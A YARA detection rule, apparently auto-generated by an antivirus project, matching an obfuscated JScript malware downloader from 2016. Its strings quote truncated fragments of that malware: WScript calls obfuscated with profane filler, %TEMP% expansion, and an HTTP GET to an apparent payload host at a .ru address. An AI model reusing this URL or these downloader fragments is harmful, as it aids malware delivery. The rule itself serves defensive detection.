rule sig_20160428_12104ba98e172a113754199739a163f2 {
  meta:
    description = "datamaliciousorder - file 20160428_12104ba98e172a113754199739a163f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a92d0a56875849524c36343b67866b4308df5886187c564c4414d9426df2b36a"

  strings:
    $s1  = "function YwsQdoVroFncNmaShtYsu(SkaMqsEiuRzwEeqZrgGbw){XgtOpvPvwIsaAcyKfePti[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function NkxSgwEnlUieLesLbnIlh() {return XgtOpvPvwIsaAcyKfePti[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function YwsQdoVroFncNmaShtYsu(SkaMqsEiuRzwEeqZrgGbw){XgtOpvPvwIsaAcyKfePti[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function RlhVfvSbbMjxTpxTofPrx(KguZavCvkKcdVgmOkvCpb, QtxNxqBvqDmtNafWefGgi){FqnVlaDvkZekLpsZplSpd = FqnVlaDvkZekLpsZplSpd * 1; " ascii
    $s5  = "return KguZavCvkKcdVgmOkvCpb - QtxNxqBvqDmtNafWefGgi;};" fullword ascii
    $s6  = "var XgtOpvPvwIsaAcyKfePti = function MqaGovPzbMfeFvgZjyUwa() {return CxaOwvLrnQbhVefIdyOyu[BkiMrqPeoNvaVsyZurMac](\"WScript\"+\"" ascii
    $s7  = "var XgtOpvPvwIsaAcyKfePti = function MqaGovPzbMfeFvgZjyUwa() {return CxaOwvLrnQbhVefIdyOyu[BkiMrqPeoNvaVsyZurMac](\"WScript\"+\"" ascii
    $s8  = "var CxaOwvLrnQbhVefIdyOyu = this[\"WScript\"];" fullword ascii
    $s9  = "function NkxSgwEnlUieLesLbnIlh() {return XgtOpvPvwIsaAcyKfePti[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function RlhVfvSbbMjxTpxTofPrx(KguZavCvkKcdVgmOkvCpb, QtxNxqBvqDmtNafWefGgi){FqnVlaDvkZekLpsZplSpd = FqnVlaDvkZekLpsZplSpd * 1; " ascii
    $s11 = "function TgdWmkBgdGcvKusTmbMfy(){return VshWknDjkQowIqaSliUby + \"\";};" fullword ascii
    $s12 = "if (RruYsgRtlJdlBwvNfwOuv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function ApqShqVcuOnhYijDeyHlt() {return ((IxuKyuUhhWsiMtzDfjDtm == true) && (IxuKyuUhhWsiMtzDfjDtm == UxbGipNmyVlvGrdGuhFyk)) ?" ascii
    $s14 = "RruYsgRtlJdlBwvNfwOuv[SkkIngCozFixPypNriFlx](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s15 = "function ApqShqVcuOnhYijDeyHlt() {return ((IxuKyuUhhWsiMtzDfjDtm == true) && (IxuKyuUhhWsiMtzDfjDtm == UxbGipNmyVlvGrdGuhFyk)) ?" ascii
    $s16 = "return RlhVfvSbbMjxTpxTofPrx(1 == 1 ? DtnWiaUhgWarEejOtwKjr : 0, 1 == 1 ? NoxOjcJkrIrpKgsCsxAic : 0);" fullword ascii
    $s17 = "UxbGipNmyVlvGrdGuhFyk = true; " fullword ascii
    $s18 = "var ZsgEstKjkMmhPcbTfqZrt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var UxbGipNmyVlvGrdGuhFyk = false;" fullword ascii
    $s20 = "}while (ThmWgjMouHngMxmBgaFvz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}